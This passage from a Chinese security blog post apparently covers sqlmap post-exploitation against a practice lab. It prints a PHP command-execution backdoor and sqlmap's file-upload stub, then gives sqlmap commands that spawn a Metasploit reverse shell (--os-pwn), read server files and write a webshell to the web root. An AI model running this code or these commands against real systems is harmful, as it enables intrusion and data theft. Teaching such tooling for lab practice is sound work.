(f(<span class="string">&quot;proc_open&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$y</span> = proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="keyword">array</span>(pipe, r), <span class="keyword">array</span>(pipe, w), <span class="keyword">array</span>(pipe, w)), <span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$t</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="variable">$w</span> .= fread(<span class="variable">$t</span>[<span class="number">1</span>], <span class="number">512</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @proc_close(<span class="variable">$y</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">&quot;shell_exec&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$w</span> = shell_exec(<span class="variable">$c</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">&quot;passthru&quot;</span>)) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    passthru(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span> = ob_get_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">&quot;popen&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$x</span> = popen(<span class="variable">$c</span>, r);</span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_resource(<span class="variable">$x</span>)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!feof(<span class="variable">$x</span>)) &#123;</span><br><span class="line">            <span class="variable">$w</span> .= fread(<span class="variable">$x</span>, <span class="number">512</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @pclose(<span class="variable">$x</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$w</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$c</span>, <span class="variable">$w</span>);</span><br><span class="line">    <span class="variable">$w</span> = join(chr(<span class="number">10</span>), <span class="variable">$w</span>) . chr(<span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$w</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>tmpumosw.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>	Dumb	Dumb</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (phpversion() &lt; <span class="string">&#x27;4.1.0&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        @move_uploaded_file(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        @move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    @chmod(<span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>, <span class="number">0755</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>] . <span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=E:\\phpStudy\\PHPTutorial\\WWW\\sql1\\Less-4\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="反弹一个MSF的shell-–os-pwn"><a href="#反弹一个MSF的shell-–os-pwn" class="headerlink" title="反弹一个MSF的shell(–os-pwn)"></a>反弹一个MSF的shell(–os-pwn)</h2><p>在数据库为<strong>MySQL、PostgreSql</strong>或者<strong>SQL Server</strong>时，可以执行该选项。并且需要当前获取的权限足够高才可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://100.142.20.139/sql1/Less-4/?id=1&quot; --os-pwn</span><br></pre></td></tr></table></figure>
+
+<h2 id="读取服务器文件-–file-read"><a href="#读取服务器文件-–file-read" class="headerlink" title="读取服务器文件(–file-read)"></a>读取服务器文件(–file-read)</h2><p>当数据库为MySQL、PostgreSQL或SQL Server，并且当前用户有权限时，可以读取指定文件，可以是文本文件或者二进制文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://100.142.20.139/sql1/Less-4/?id=1&quot; --file-read &quot;E:\phpStudy\PHPTutorial\WWW\sql1\Less-4\test.txt&quot; #读取目标服务器C盘下的test.txt文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597286330829-6737bd0a-5209-4ca1-b04b-7ed5b34628be.png" alt="img"></p>
+<p>文件成功读取保存到上图路径</p>
+<h2 id="上传文件到数据库服务器中-–file-write-–file-dest"><a href="#上传文件到数据库服务器中-–file-write-–file-dest" class="headerlink" title="上传文件到数据库服务器中(–file-write –file-dest)"></a>上传文件到数据库服务器中(–file-write –file-dest)</h2><p>当数据库为MySQL、Postgre SQL或者Sql Server(通过powershell写入)，并且当前用户有权限向任意目录写文件的时候，可以上传文件到数据库服务器。文件可以是文本，也可以是二进制文件。</p>
+<p>所以利用上传文件，我们可以上传一句话木马或者上传shell上去。</p>
+<p>前提是我们知道<strong>网络的绝对路径</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u <span class="string">&quot;http://100.142.20.139/sql1/Less-4/?id=1&quot;</span> --file-write C:\Users\DropAnn\Desktop\1.php --file-dest <span class="string">&quot;E:\phpStudy\PHPTutorial\WWW\sql1\Less-4\test.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597287324224-520b16bd-e3a7-4bfc-ad06-f6a9f1bc8abd.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597287293120-34ab88fb-8ae1-4b1a-85cf-08c4750871f4.png" alt="img"></p>
+<p>判断是否上传成功判断，对比文件大小是否一致</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597287369895-d098d17a-4139-42d8-a304-eb449773c91c.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597287377502-f0c3116c-02ad-4ab3-8df5-ee364bd0fc30.png" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">DropAnn</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dropann.github.io/p/2f610211.html">https://dropann.github.io/p/2f610211.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://dropann.github.io" target="_blank">DropAnn</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a></div><div class="post_share"><div class="social-share" data-image="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/86476698_p0_master1200.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/p/884863d2.html"><img class="next-cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/102038875_p0_master1200.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">端口服务对应的漏洞利用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/p/590ce9be.html" title="渗透测试"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/87245942_p0_master1200.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-04</div><div class="title">渗透测试</div></div></a></div><div><a href="/p/884863d2.html" title="端口服务对应的漏洞利用"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/102038875_p0_master1200.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-04</div><div class="title">端口服务对应的漏洞利用</div></div></a></div><div><a href="/p/931c692.html" title="文件上传漏洞"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/101678113_p0_master1200.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-25</div><div class="title">文件上传漏洞</div></div></a></div><div><a href="/p/68bdea49.html" title="XSS"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/101678113_p0_master1200.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-13</div><div class="title">XSS</div></div></a></div><div><a href="/p/4089de4e.html" title="文件包含漏洞"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/93031672_p0_master1200.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-26</div><div class="title">文件包含漏洞</div></div></a></div><div><a href="/p/36303170.html" title="PHPmua"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/100950997_p0_master1200.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-23</div><div class="title">PHPmua</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210819224420.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">DropAnn</div><div class="author-info__description">在研发和安服仔之间徘徊</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DropAnn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/DropAnn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:dropann@hotmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E7%9B%B8%E5%85%B3"><span class="toc-number">1.1.</span> <span class="toc-text">数据库用户相关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.</span> <span class="toc-text">获取数据库数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93-%E2%80%93dbs"><span class="toc-number">1.2.1.</span> <span class="toc-text">查看所有数据库(–dbs)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E7%9A%84%E8%A1%A8%EF%BC%88-D-%E5%BA%93%E5%90%8D-%E2%80%93tables%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">获取所有的表（-D [库名] –tables）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E7%9A%84%E5%88%97%EF%BC%88-D-%E5%BA%93%E5%90%8D-T-%E8%A1%A8%E5%90%8D-%E2%80%93columns%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">获取所有的列（-D [库名] -T [表名] –columns）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%EF%BC%88-D-%E5%BA%93%E5%90%8D-T-%E8%A1%A8%E5%90%8D-C-%E5%88%97%E5%90%8D-%E2%80%93dump%EF%BC%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">获取指定数据（-D [库名] -T [表名] -C [列名] –dump）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE-%E2%80%93dump-all"><span class="toc-number">1.2.5.</span> <span class="toc-text">数据库中所有数据(–dump-all)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.</span> <span class="toc-text">指定注入类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.</span> <span class="toc-text">查看详细信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8BWAF%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">探测WAF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%AD%89%E7%BA%A7%E5%92%8C%E5%8D%B1%E9%99%A9%E7%AD%89%E7%BA%A7-%E2%80%93level-%E2%80%93risk"><span class="toc-number">2.1.</span> <span class="toc-text">探测等级和危险等级(–level –risk)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0Http-Referer%E5%A4%B4%E9%83%A8"><span class="toc-number">2.2.</span> <span class="toc-text">伪造Http Referer头部</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87-%E2%80%93tamper"><span class="toc-number">2.3.</span> <span class="toc-text">指定脚本进行绕过(–tamper)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">注入后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%8C%87%E5%AE%9A%E7%9A%84SQL%E8%AF%AD%E5%8F%A5-%E2%80%93sql-shell"><span class="toc-number">3.1.</span> <span class="toc-text">执行指定的SQL语句(–sql-shell)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-%E2%80%93os-shell"><span class="toc-number">3.2.</span> <span class="toc-text">执行操作系统命令(–os-shell)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9%E4%B8%80%E4%B8%AAMSF%E7%9A%84shell-%E2%80%93os-pwn"><span class="toc-number">3.3.</span> <span class="toc-text">反弹一个MSF的shell(–os-pwn)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6-%E2%80%93file-read"><span class="toc-number">3.4.</span> <span class="toc-text">读取服务器文件(–file-read)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD-%E2%80%93file-write-%E2%80%93file-dest"><span class="toc-number">3.5.</span> <span class="toc-text">上传文件到数据库服务器中(–file-write –file-dest)</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/2f610211.html" title="反弹shell">反弹shell</a><time datetime="2022-11-10T05:21:06.000Z" title="发表于 2022-11-10 13:21:06">2022-11-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/884863d2.html" title="端口服务对应的漏洞利用">端口服务对应的漏洞利用</a><time datetime="2022-11-03T21:58:22.000Z" title="发表于 2022-11-04 05:58:22">2022-11-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/590ce9be.html" title="渗透测试">渗透测试</a><time datetime="2022-11-03T21:56:09.000Z" title="发表于 2022-11-04 05:56:09">2022-11-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/a2c49dae.html" title="PowerShell">PowerShell</a><time datetime="2022-11-02T10:27:56.000Z" title="发表于 2022-11-02 18:27:56">2022-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/931c692.html" title="文件上传漏洞">文件上传漏洞</a><time datetime="2022-10-25T03:48:23.000Z" title="发表于 2022-10-25 11:48:23">2022-10-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By DropAnn</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?dropann";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="dropann";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body></html>
